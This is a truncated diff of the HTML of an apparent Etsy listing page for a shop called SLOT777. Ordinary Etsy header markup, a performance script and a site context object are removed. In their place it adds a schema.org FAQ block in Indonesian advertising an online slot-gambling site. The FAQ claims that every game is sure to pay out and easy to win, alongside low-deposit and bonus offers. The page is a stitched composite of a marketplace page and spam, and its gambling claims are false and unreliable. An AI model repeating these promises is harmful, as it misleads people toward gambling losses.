-    </a>
-</li><li class="wt-sem-text-primary wt-list-unstyled">
-    <a role="menuitem" href="https://www.etsy.com/logout.php?ref=hdr_user_menu-signout" class="wt-menu__item wt-display-flex-xs wt-align-items-center wt-justify-content-flex-start wt-pt-xs-1 wt-pb-xs-1" >
-        <div><span class="etsy-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M2.7 11.3L2 12l.7.7 4 4c.4.4 1 .4 1.4 0 .4-.4.4-1 0-1.4L5.8 13H15c.6 0 1-.4 1-1s-.4-1-1-1H5.8l2.3-2.3c.2-.2.3-.4.3-.7 0-.6-.4-1-1-1-.3 0-.5.1-.7.3l-4 4z"/><path d="M22 19H10v-2h10V7H10V5h12z"/></svg></span></div>
-        <div class="wt-ml-xs-2 wt-flex-grow-xs-1" >
-            <p class="wt-text-caption wt-display-inline wt-m-xs-0">Sign out</p>
-        </div>
-    </a>
-</li>
-            </ul>
-
-</div>
-        <span class="ge-menu__body-caret wt-z-index-10 wt-bg-white wt-position-absolute wt-bl-xs wt-bt-xs"></span>
-
-</div></li>
-<li 
-    data-ge-nav-menu="cart"
-    data-ge-hover-event-name="gnav_hover_cart_menu"
->
-    <span class="wt-tooltip wt-tooltip--bottom-left wt-tooltip--disabled-touch" data-wt-tooltip data-header-cart-button>
-        <a aria-label="Basket with 0 items" href="https://www.etsy.com/cart?ref=hdr-cart" class="wt-tooltip__trigger wt-tooltip__trigger--icon-only wt-btn wt-btn--transparent wt-btn--icon header-button">
-            <span class="wt-z-index-1 wt-no-wrap wt-display-none ge-cart-badge wt-badge wt-badge--notificationPrimary wt-badge--small wt-badge--outset-top-right" data-selector="header-cart-count" aria-hidden="true">
-                0
-            </span>
-            <span class="wt-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 3a5 5 0 0 0-5 5v1H2.447l2.4 12h14.306l2.4-12H17V8a5 5 0 0 0-5-5m0 2a3 3 0 0 0-3 3v1h6V8a3 3 0 0 0-3-3M6.486 19l-1.6-8h14.227l-1.6 8z"/></svg></span>
-        </a>
-        <span role="tooltip" aria-hidden="true">Basket</span>
-    </span>
-</li>
-
-
-<div data-clg-id="WtOverlay" class="wt-overlay" id="overlay-transaction-review-react" aria-hidden="true" aria-modal="false" role="dialog" aria-label="Module displaying the review form" data-wt-overlay>
-    <div class="wt-overlay__modal" data-overlay-modal>
-            <div data-leave-review-form-overlay-body aria-live="polite" aria-busy="true">
-    </div>
-
-    </div>
-</div>
-    </ul>
-</nav>
-        </div>
-    </header>
-
-    
-</div>
-
-
-
-
-
-<div class="wt-overlay wt-z-index-4" aria-hidden="true" data-ui="overlay"></div>
-
-<noscript>
-    <div class="wt-body-max-width wt-pt-xs-2 wt-pl-xs-2 wt-pr-xs-2 wt-pl-md-4 wt-pr-md-4 wt-pt-md-3 wt-pb-xs-0">
-        <div id="javascript-nag" class="wt-alert wt-alert--inline wt-alert--success-01 wt-mb-xs-2">
-            <div> Take full advantage of our site features by enabling JavaScript. </div>
-        </div>
-    </div>
-</noscript>
-<div class="sidebar-cart-carat"></div>
-        <div data-below-header>
-            
-        </div>
-        
-
-        
-
-            <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">
-    var webVitals=function(e){"use strict";var t,n,i,r,o,a=function(){return window.performance&&performance.getEntriesByType&&performance.getEntriesByType("navigation")[0]},u=function(e){if("loading"===document.readyState)return"loading";var t=a();if(t){if(e<t.domInteractive)return"loading";if(0===t.domContentLoadedEventStart||e<t.domContentLoadedEventStart)return"dom-interactive";if(0===t.domComplete||e<t.domComplete)return"dom-content-loaded"}return"complete"},c=function(e){var t=e.nodeName;return 1===e.nodeType?t.toLowerCase():t.toUpperCase().replace(/^#/,"")},s=function(e,t){var n="";try{for(;e&&9!==e.nodeType;){var i=e,r=i.id?"#"+i.id:c(i)+(i.classList&&i.classList.value&&i.classList.value.trim()&&i.classList.value.trim().length?"."+i.classList.value.trim().replace(/\s+/g,"."):"");if(n.length+r.length>(t||100)-1)return n||r;if(n=n?r+">"+n:r,i.id)break;e=i.parentNode}}catch(o){}return n},d=-1,f=function(e){addEventListener("pageshow",function(t){t.persisted&&(d=t.timeStamp,e(t))},!0)},l=function(){var e=a();return e&&e.activationStart||0},p=function(e,t){var n=a(),i="navigate";return d>=0?i="back-forward-cache":n&&(document.prerendering||l()>0?i="prerender":document.wasDiscarded?i="restore":n.type&&(i=n.type.replace(/_/g,"-"))),{name:e,value:void 0===t?-1:t,rating:"good",delta:0,entries:[],id:"v3-".concat(Date.now(),"-").concat(Math.floor(8999999999999*Math.random())+1e12),navigationType:i}},v=function(e,t,n){try{if(PerformanceObserver.supportedEntryTypes.includes(e)){var i=new PerformanceObserver(function(e){Promise.resolve().then(function(){t(e.getEntries())})});return i.observe(Object.assign({type:e,buffered:!0},n||{})),i}}catch(r){}},$=function(e,t,n,i){var r,o;return function(a){var u,c;t.value>=0&&(a||i)&&((o=t.value-(r||0))||void 0===r)&&(r=t.value,t.delta=o,t.rating=(u=t.value,u>(c=n)[1]?"poor":u>c[0]?"needs-improvement":"good"),e(t))}},m=function(e){requestAnimationFrame(function(){return requestAnimationFrame(function(){return e()})})},g=function(e){var t=function(t){"pagehide"!==t.type&&"hidden"!==document.visibilityState||e(t)};addEventListener("visibilitychange",t,!0),addEventListener("pagehide",t,!0)},y=function(e){var t=!1;return function(n){t||(e(n),t=!0)}},h=-1,T=function(){return"hidden"!==document.visibilityState||document.prerendering?1/0:0},b=function(e){"hidden"===document.visibilityState&&h>-1&&(h="visibilitychange"===e.type?e.timeStamp:0,S())},_=function(){addEventListener("visibilitychange",b,!0),addEventListener("prerenderingchange",b,!0)},S=function(){removeEventListener("visibilitychange",b,!0),removeEventListener("prerenderingchange",b,!0)},E=function(e){document.prerendering?addEventListener("prerenderingchange",function(){return e()},!0):e()},w={passive:!0,capture:!0},C=new Date,L=function(e,r){t||(t=r,n=e,i=new Date,x(removeEventListener),I())},I=function(){if(n>=0&&n<i-C){var e={entryType:"first-input",name:t.type,target:t.target,cancelable:t.cancelable,startTime:t.timeStamp,processingStart:t.timeStamp+n};r.forEach(function(t){t(e)}),r=[]}},k=function(e){if(e.cancelable){var t,n,i,r,o,a=(e.timeStamp>1e12?new Date:performance.now())-e.timeStamp;"pointerdown"==e.type?(t=a,n=e,i=function(){L(t,n),o()},r=function(){o()},o=function(){removeEventListener("pointerup",i,w),removeEventListener("pointercancel",r,w)},addEventListener("pointerup",i,w),addEventListener("pointercancel",r,w)):L(a,e)}},x=function(e){["mousedown","keydown","touchstart","pointerdown"].forEach(function(t){return e(t,k,w)})},P=0,B=1/0,D=0,N=function(e){e.forEach(function(e){e.interactionId&&(B=Math.min(B,e.interactionId),P=(D=Math.max(D,e.interactionId))?(D-B)/7+1:0)})},R=function(){return o?P:performance.interactionCount||0},A=function(){"interactionCount"in performance||o||(o=v("event",N,{type:"event",buffered:!0,durationThreshold:0}))},F=[200,500],H=0,q=function(){return R()-H},M=[],U={},V=function(e){var t=M[M.length-1],n=U[e.interactionId];if(n||M.length<10||e.duration>t.latency){if(n)n.entries.push(e),n.latency=Math.max(n.latency,e.duration);else{var i={id:e.interactionId,latency:e.duration,entries:[e]};U[i.id]=i,M.push(i)}M.sort(function(e,t){return t.latency-e.latency}),M.splice(10).forEach(function(e){delete U[e.id]})}},j=function(e,t){t=t||{},E(function(){A();var n,i,r=p("INP"),o=function(e){e.forEach(function(e){e.interactionId&&V(e),"first-input"!==e.entryType||M.some(function(t){return t.entries.some(function(t){return e.duration===t.duration&&e.startTime===t.startTime})})||V(e)});var t,n=M[t=Math.min(M.length-1,Math.floor(q()/50))];n&&n.latency!==r.value&&(r.value=n.latency,r.entries=n.entries,i())},a=v("event",o,{durationThreshold:null!==(n=t.durationThreshold)&&void 0!==n?n:40});i=$(e,r,F,t.reportAllChanges),a&&("interactionId"in PerformanceEventTiming.prototype&&a.observe({type:"first-input",buffered:!0}),g(function(){o(a.takeRecords()),r.value<0&&q()>0&&(r.value=0,r.entries=[]),i(!0)}),f(function(){M=[],H=R(),r=p("INP"),i=$(e,r,F,t.reportAllChanges)}))})},z=[2500,4e3],G={};return e.onINP=function(e,t){j(function(t){(function(e){if(e.entries.length){var t=e.entries.sort(function(e,t){return t.duration-e.duration||t.processingEnd-t.processingStart-(e.processingEnd-e.processingStart)})[0];e.attribution={eventTarget:s(t.target),eventType:t.name,eventTime:t.startTime,eventEntry:t,loadState:u(t.startTime)}}else e.attribution={}})(t),e(t)},t)},e.onLCP=function(e,t){var n,i;n=function(t){(function(e){if(e.entries.length){var t=a();if(t){var n=t.activationStart||0,i=e.entries[e.entries.length-1],r=i.url&&performance.getEntriesByType("resource").filter(function(e){return e.name===i.url})[0],o=Math.max(0,t.responseStart-n),u=Math.max(o,r?(r.requestStart||r.startTime)-n:0),c=Math.max(u,r?r.responseEnd-n:0),d=Math.max(c,i?i.startTime-n:0),f={element:s(i.element),timeToFirstByte:o,resourceLoadDelay:u-o,resourceLoadTime:c-u,elementRenderDelay:d-c,navigationEntry:t,lcpEntry:i};return i.url&&(f.url=i.url),r&&(f.lcpResourceEntry=r),void(e.attribution=f)}}e.attribution={timeToFirstByte:0,resourceLoadDelay:0,resourceLoadTime:0,elementRenderDelay:e.value}})(t),e(t)},i=(i=t)||{},E(function(){var e,t=(h<0&&(h=T(),_(),f(function(){setTimeout(function(){h=T(),_()},0)})),{get firstHiddenTime(){return h}}),r=p("LCP"),o=function(n){var i=n[n.length-1];i&&i.startTime<t.firstHiddenTime&&(r.value=Math.max(i.startTime-l(),0),r.entries=[i],e())},a=v("largest-contentful-paint",o);if(a){e=$(n,r,z,i.reportAllChanges);var u=y(function(){G[r.id]||(o(a.takeRecords()),a.disconnect(),G[r.id]=!0,e(!0))});["keydown","click"].forEach(function(e){addEventListener(e,function(){return setTimeout(u,0)},!0)}),g(u),f(function(t){r=p("LCP"),e=$(n,r,z,i.reportAllChanges),m(function(){r.value=performance.now()-t.timeStamp,G[r.id]=!0,e(!0)})})}})},Object.defineProperty(e,"__esModule",{value:!0}),e}({});
+    <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "Apa itu Slot Qris?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Slot Qris adalah platform situs gacor terbaik dan terpercaya mudah menang maxwin di hari ini."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Apakah Situs Gacor Slot Qris Gacor?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Ya, semua game gacor di situs slot qris pasti gacor mudah menang maxwin di hari ini."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Seberapa sering rtp slot diperbarui?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "rtp slot diperbarui secara real-time setiap hari mengikuti jadwal pengundian resmi."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Apakah slot qris bisa diakses melalui perangkat mobile?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Bisa. slot qris memiliki tampilan responsif sehingga dapat diakses dengan lancar melalui HP, tablet, maupun desktop."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Apa manfaat bermain disitus slot gacor hari ini?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Dengan data yang lengkap dan tepat waktu, pemain dapat melihat rtp slot gacor yang terkini dan update setiap hari."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "slot qris bisa melakukan deposit hanya 10k?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Ya, situs slot qris bisa melakukan deposit hanya 10k sudah bisa bermain di situs slot gacor hari ini."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Apakah situs slot menyediakan bonus?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "slog qris menyediakan bonus new member 10% bagi penggunan baru untuk melakukan deposit sudah bisa langsung di claim dan akun langsung masuk ke akun."
+      }
+    }
+  ]
+}
 </script>
+</head>
 
-        <script nonce="gPiNOjdRCrWLas5Ik2CuS+N0">
-        window.Etsy=window.Etsy||{};
-        Etsy.Context=Etsy.Context||{};
-        (function() {
-            function assign(firstSource, secondSource) {
-                if (!secondSource) return;
-                var out = Object(firstSource);
-                for (var key in secondSource) {
-                    if (Object.prototype.hasOwnProperty.call(secondSource, key)) {
-                        out[key] = secondSource[key];
-                    }
-                }
-                return out;
-            }
-            Etsy.Context.feature=assign(Etsy.Context.feature ? Etsy.Context.feature : {}, {"profile_dropdown_to_help_center":true,"sitewide_si_mweb_gated_favoriting":false,"isAppShellEnabled":true,"core_fulfillment.product_level_readiness_states":false,"design_systems.buybox_performance_web_components":false,"seller_platform_web.buyer_inquiry":false,"seller_platform_web.seller_local_time":false,"seller_platform_web.item_detail_overlay":true,"buyer_promise.issue_resolution.fee_avoidance_v2":true,"content_moderation.convo_safety.structured_convos":false,"risk_experience.buyer_email_verification":false});
-            Etsy.Context.data=assign(Etsy.Context.data ? Etsy.Context.data : {}, {"is_mobile":false,"should_auto_redirect":false,"locale_settings":{"language":{"code":"en-GB","id":2,"name":"English (UK)","translation":"English (UK)","is_detected":false,"is_default":false},"currency":{"currency_id":360,"code":"IDR","name":"Indonesian Rupiah","number_precision":0,"symbol":"Rp","listing_enabled":true,"browsing_enabled":true,"buyer_location_restricted":false,"rate_updates_enabled":true,"is_synthetic":true,"is_detected":false,"is_default":false,"append_currency_symbol":false},"region":{"code":"ID","country_id":121,"name":"Indonesia","translation":"Indonesia","is_detected":false,"is_default":false,"is_EU_region":false},"subdir_code":""},"neu_api_specs_sample_rate":null,"FB_GRAPHQL_VERSION":"v2.10","page_guid":"ffd82861b31.44b97b90cfaedc166dd4.00","primary_event_name":"view_listing","request_uuid":"EuWhMmYDWq2W7QI9Hqf8w2F9Zf4c","user_is_test_account":false,"user_id":1135369000,"css_variant":"sasquatch","runtime_analysis":false,"collage_shadow_dom_css_url":"https:\/\/www.etsy.com\/ac\/sasquatch\/css\/collage\/shadow.ba269cdecb93d2.css","vite_public_path":"https:\/\/www.etsy.com\/ac\/alphaVite\/js\/en-GB\/","is_app_shell":true,"csrf_nonce":"3:1758149097:uFOzO21NdRs68cZg6DS5qjvL1f9r:7518109ea94ca93016d63283d1a4a1dae00e70374a01527543eef133c137a3d4","uaid_nonce":"3:1758149097:jN5WV4yGC6bv-Y8gTz1rwqhWHeiQ:0cafa0e88e72ec07d7547dabb6a6d89ba489d98702d5b9d61cec91e06677cb61","clientlogger":{"is_enabled":true,"endpoint":"\/clientlog","logs_per_page":6,"id":"EuWhMmYDWq2W7QI9Hqf8w2F9Zf4c","digest":"ab599b0d4306cb21a1b94ce2fceed7bf07d6655e","enabled_features":["info","warn","error","basic","uncaught"]},"01125905a4e5ddf2_appshell_fallback":"recs-impression","3c65557fa67e42dc_appshell_fallback":"b8e259fc11597ab4d","c5420ec98ed7db34_appshell_fallback":"b6bdc236b8281fb35","imp_listener_sources":["ads","search","recs","nonlisting"],"impact_tracker_should_prompt_signin":false,"impact_tracker_should_direct_open":false,"shop_favorites_see_all_link":"See all","shop_favorites_search_header":"Shops you follow","is_mobile_shop_search":false,"show_simplified_mobile_header":false,"is_eligible_for_ship_to_setting_in_global_header":false,"remove_catnav_for_bots":false,"new_convo_count":0,"review-your-purchases-nav":true,"should_show_holidays_review_msg":false,"in_cart_count":0,"guest_uaid":"3risB690iqgVMEj0sW3Jxya5aa04","page_type":"view_listing","is_desktop_mini_favorites_operational_enabled":false,"should_show_preview_of_update":false,"clickable_nav":true,"has_dropdown":true,"add_vintage_node":false,"images_in_l2":false,"recs":[],"mweb_full_screen_search_dropdown":false,"relocate_cat_nav":false,"zero_pane_recent_searches":[],"is_eligible_to_fetch_category_suggestions":false,"category_suggestions_in_autosuggest_variant":null,"is_eligible_for_contentful_title_on_trending_searches":true,"is_eligible_for_always_show_shop_search":true,"is_eligible_for_search_bar_improvements":false,"is_eligible_for_refinement_pills_in_autosuggest":false,"mott_version":"761dfd2","catnav_show_sales":false,"catnav_gift_guide":"off","gifting_catnav_flyout_js":false,"should_show_registry_on_nav":false,"should_use_gifting_taxos_in_nav_flyout":false,"impact_message":{"footer_renewable_impact":{"impact_name":"footer_renewable_impact","impact_themes":["sustainability"],"impact_audiences":["buyers"]}},"airgap_url":"https:\/\/transcend-cdn.com\/cm\/ac71e058-41b7-4026-b482-3d9b8e31a6d0\/airgap.js","airgap_bundle":"control_bundle","dual_write_enabled":true,"google_tag_manager_async_enabled":false,"dynamic_privacy_settings_ui_enabled":false,"forced_data_regimes":"","has_forced_data_regimes":false,"all_purposes":["Advertising","Functional"],"all_regimes":["us-gpc","consent-prompt"],"default_consent_expiry":518400,"disable_advertising_regimes":[],"seller_is_viewing_own_listing":false,"listingId":1790774795,"listing_price":5.20000000000000017763568394002504646778106689453125,"shopId":54267703,"shop_id":54267703,"shop_name":"SLOT777","custom_orders_listings2":true,"is_listing_preview":false,"checkout_decorator":"","was_landing_from_external_referrer":true,"should_collapse_neighbors":false,"should_open_single_content_toggle":false,"is_logged_in":true,"referring_listing_id":1790774795,"address_formats":{"0":{"postal_code_type":"postal","postal_code_pattern":null,"postal_code_placeholder":"","country_iso_code":"ZZ"},"55":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"AF"},"306":{"postal_code_type":"postal","postal_code_pattern":"22\\d{3}","postal_code_placeholder":"","country_iso_code":"AX"},"57":{"postal_code_type":"Postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"AL"},"95":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"DZ"},"250":{"postal_code_type":"zip","postal_code_pattern":"(96799)(?:[ \\-](\\d{4}))?","postal_code_placeholder":"","country_iso_code":"AS"},"228":{"postal_code_type":"postal","postal_code_pattern":"AD[1-7]0\\d","postal_code_placeholder":"","country_iso_code":"AD"},"251":{"postal_code_type":"postal","postal_code_pattern":"(?:AI-)?2640","postal_code_placeholder":"","country_iso_code":"AI"},"59":{"postal_code_type":"postal","postal_code_pattern":"((?:[A-HJ-NP-Z])?\\d{4})([A-Z]{3})?","postal_code_placeholder":"","country_iso_code":"AR"},"60":{"postal_code_type":"postal","postal_code_pattern":"(?:37)?\\d{4}","postal_code_placeholder":"","country_iso_code":"AM"},"61":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"3393","country_iso_code":"AU"},"62":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"AT"},"63":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"AZ"},"232":{"postal_code_type":"postal","postal_code_pattern":"(?:^|\\b)(?:1[0-2]|[1-9])\\d{2}(?:$|\\b)","postal_code_placeholder":"","country_iso_code":"BH"},"68":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"BD"},"237":{"postal_code_type":"Postal","postal_code_pattern":"BB\\d{5}","postal_code_placeholder":"","country_iso_code":"BB"},"71":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"BY"},"65":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"BE"},"225":{"postal_code_type":"postal","postal_code_pattern":"[A-Z]{2} ?[A-Z0-9]{2}","postal_code_placeholder":"","country_iso_code":"BM"},"76":{"postal_code_type":"Postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"BT"},"70":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"BA"},"74":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}-?\\d{3}","postal_code_placeholder":"","country_iso_code":"BR"},"255":{"postal_code_type":"postal","postal_code_pattern":"BBND 1ZZ","postal_code_placeholder":"","country_iso_code":"IO"},"231":{"postal_code_type":"postal","postal_code_pattern":"VG\\d{4}","postal_code_placeholder":"","country_iso_code":"VG"},"75":{"postal_code_type":"postal","postal_code_pattern":"[A-Z]{2} ?\\d{4}","postal_code_placeholder":"","country_iso_code":"BN"},"69":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"BG"},"135":{"postal_code_type":"postal","postal_code_pattern":"\\d{5,6}","postal_code_placeholder":"","country_iso_code":"KH"},"79":{"postal_code_type":"postal","postal_code_pattern":"[ABCEGHJKLMNPRSTVXY]\\d[ABCEGHJ-NPRSTV-Z] ?\\d[ABCEGHJ-NPRSTV-Z]\\d","postal_code_placeholder":"A1A 1A1","country_iso_code":"CA"},"222":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"CV"},"247":{"postal_code_type":"postal","postal_code_pattern":"KY\\d-\\d{4}","postal_code_placeholder":"","country_iso_code":"KY"},"81":{"postal_code_type":"postal","postal_code_pattern":"\\d{7}","postal_code_placeholder":"","country_iso_code":"CL"},"82":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"CN"},"257":{"postal_code_type":"postal","postal_code_pattern":"6798","postal_code_placeholder":"","country_iso_code":"CX"},"258":{"postal_code_type":"postal","postal_code_pattern":"6799","postal_code_placeholder":"","country_iso_code":"CC"},"86":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"CO"},"87":{"postal_code_type":"postal","postal_code_pattern":"\\d{4,5}|\\d{3}-\\d{4}","postal_code_placeholder":"","country_iso_code":"CR"},"118":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"HR"},"88":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"CU"},"89":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"CY"},"90":{"postal_code_type":"postal","postal_code_pattern":"\\d{3} ?\\d{2}","postal_code_placeholder":"","country_iso_code":"CZ"},"93":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"DK"},"94":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"DO"},"96":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"EC"},"97":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"EG"},"187":{"postal_code_type":"postal","postal_code_pattern":"CP [1-3][1-7][0-2]\\d","postal_code_placeholder":"CP 1101","country_iso_code":"SV"},"100":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"EE"},"101":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"ET"},"262":{"postal_code_type":"postal","postal_code_pattern":"FIQQ 1ZZ","postal_code_placeholder":"","country_iso_code":"FK"},"241":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}","postal_code_placeholder":"","country_iso_code":"FO"},"102":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"FI"},"103":{"postal_code_type":"postal","postal_code_pattern":"\\d{2} ?\\d{3}","postal_code_placeholder":"75000","country_iso_code":"FR"},"115":{"postal_code_type":"postal","postal_code_pattern":"9[78]3\\d{2}","postal_code_placeholder":"","country_iso_code":"GF"},"263":{"postal_code_type":"postal","postal_code_pattern":"987\\d{2}","postal_code_placeholder":"","country_iso_code":"PF"},"106":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"GE"},"91":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"80331","country_iso_code":"DE"},"226":{"postal_code_type":"postal","postal_code_pattern":"GX11 1AA","postal_code_placeholder":"","country_iso_code":"GI"},"112":{"postal_code_type":"postal","postal_code_pattern":"\\d{3} ?\\d{2}","postal_code_placeholder":"104 31","country_iso_code":"GR"},"113":{"postal_code_type":"postal","postal_code_pattern":"39\\d{2}","postal_code_placeholder":"","country_iso_code":"GL"},"265":{"postal_code_type":"postal","postal_code_pattern":"9[78][01]\\d{2}","postal_code_placeholder":"","country_iso_code":"GP"},"266":{"postal_code_type":"zip","postal_code_pattern":"(969(?:[12]\\d|3[12]))(?:[ \\-](\\d{4}))?","postal_code_placeholder":"","country_iso_code":"GU"},"114":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"GT"},"305":{"postal_code_type":"postal","postal_code_pattern":"GY\\d[\\dA-Z]? ?\\d[ABD-HJLN-UW-Z]{2}","postal_code_placeholder":"","country_iso_code":"GG"},"108":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}","postal_code_placeholder":"","country_iso_code":"GN"},"110":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"GW"},"119":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"HT"},"267":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"HM"},"268":{"postal_code_type":"postal","postal_code_pattern":"00120","postal_code_placeholder":"","country_iso_code":"VA"},"117":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"HN"},"120":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"HU"},"126":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}","postal_code_placeholder":"","country_iso_code":"IS"},"122":{"postal_code_type":"pin","postal_code_pattern":"^[1-9][0-9]{5}$","postal_code_placeholder":"110001","country_iso_code":"IN"},"121":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"ID"},"124":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}-?\\d{5}","postal_code_placeholder":"","country_iso_code":"IR"},"125":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"IQ"},"123":{"postal_code_type":"eircode","postal_code_pattern":null,"postal_code_placeholder":"","country_iso_code":"IE"},"269":{"postal_code_type":"postal","postal_code_pattern":"IM\\d[\\dA-Z]? ?\\d[ABD-HJLN-UW-Z]{2}","postal_code_placeholder":"","country_iso_code":"IM"},"127":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}(?:\\d{2})?","postal_code_placeholder":"","country_iso_code":"IL"},"128":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"50100","country_iso_code":"IT"},"131":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}-?\\d{4}","postal_code_placeholder":"100-0001","country_iso_code":"JP"},"307":{"postal_code_type":"postal","postal_code_pattern":"JE\\d[\\dA-Z]? ?\\d[ABD-HJLN-UW-Z]{2}","postal_code_placeholder":"","country_iso_code":"JE"},"130":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"JO"},"132":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"KZ"},"133":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"KE"},"137":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"KW"},"134":{"postal_code_type":"postal","postal_code_pattern":"\\d{6}","postal_code_placeholder":"","country_iso_code":"KG"},"138":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"LA"},"146":{"postal_code_type":"postal","postal_code_pattern":"LV-\\d{4}","postal_code_placeholder":"","country_iso_code":"LV"},"139":{"postal_code_type":"postal","postal_code_pattern":"(?:\\d{4})(?: ?(?:\\d{4}))?","postal_code_placeholder":"","country_iso_code":"LB"},"143":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}","postal_code_placeholder":"","country_iso_code":"LS"},"140":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"LR"},"272":{"postal_code_type":"postal","postal_code_pattern":"948[5-9]|949[0-8]","postal_code_placeholder":"","country_iso_code":"LI"},"144":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"LT"},"145":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"LU"},"151":{"postal_code_type":"postal","postal_code_pattern":"\\d{4}","postal_code_placeholder":"","country_iso_code":"MK"},"149":{"postal_code_type":"postal","postal_code_pattern":"\\d{3}","postal_code_placeholder":"","country_iso_code":"MG"},"159":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"MY"},"238":{"postal_code_type":"postal","postal_code_pattern":"\\d{5}","postal_code_placeholder":"","country_iso_code":"MV"},"227":{"postal_code_type":"postal","postal_code_pattern":"[A-Z]{3} ?\\d{2,4}","postal_code_placeholder":"","country_iso_code":"MT"},"274":{"postal_code_type":"zip","postal_code_pattern":"(969[67]\\d)(?:[ 